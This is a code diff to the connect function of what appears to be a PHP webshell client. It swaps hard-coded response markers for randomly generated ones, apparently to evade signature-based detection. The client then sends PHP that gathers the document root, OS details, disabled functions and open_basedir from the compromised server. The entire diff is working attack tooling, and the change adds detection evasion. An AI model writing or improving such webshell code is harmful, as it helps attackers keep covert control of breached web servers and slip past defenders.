@@ -1,9 +1,11 @@
 from os import path, SEEK_END
+from random import randint
+from string import ascii_letters,digits
 from urllib.parse import urlparse, parse_qs
 
 from libs.config import alias, color, gget, gset, set_namespace
 from libs.app import value_translation
-from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template
+from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template, randstr
 
 """
 url ['webshell']
@@ -103,18 +105,20 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
     )
     gset("webshell.pwd", ".", namespace="webshell")
     gset("webshell.bypass_df", -1, namespace="webshell")
+    version_flag_start = randstr(string = ascii_letters + digits, offset = randint(32,62))
+    version_flag_end = randstr(string = ascii_letters + digits, offset = randint(32,62))
     res = send(
-        'print("c4ca4238a0b923820d|".phpversion()."|cc509a6f75849b");', raw=True)
-    if (not res or "c4ca4238a0b923820d" not in res.r_text):
+        'print("'+ version_flag_start +'|".phpversion()."|' + version_flag_end + '");', raw=True)
+    if (not res or version_flag_start not in res.r_text):
         print(color.red("Connect failed..."))
         if (res):
             print(res.r_text)
         return False
     if ('7.' in res.r_text):
         gset("webshell.v7", True, namespace="webshell")
-    if "c4ca4238a0b923820d" in res.r_text:  # 验证是否成功连接
-        gset("webshell.php_version", res.r_text.split("c4ca4238a0b923820d|")[
-             1].split("|cc509a6f75849b")[0], namespace="webshell")
+    if version_flag_start in res.r_text:  # 验证是否成功连接
+        gset("webshell.php_version", res.r_text.split(version_flag_start + "|")[
+             1].split("|" + version_flag_end)[0], namespace="webshell")
         info_req = send(
             """print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions').'|'.ini_get('open_basedir'));"""
         )
